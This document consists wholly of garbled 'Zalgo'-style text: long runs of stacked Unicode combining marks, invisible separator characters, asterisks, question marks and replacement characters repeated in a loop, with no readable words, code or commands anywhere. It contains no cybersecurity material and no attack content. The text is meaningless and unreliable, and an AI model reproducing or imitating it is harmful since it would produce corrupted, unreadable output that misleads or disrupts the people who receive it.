̯̱̪͍͉̟͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡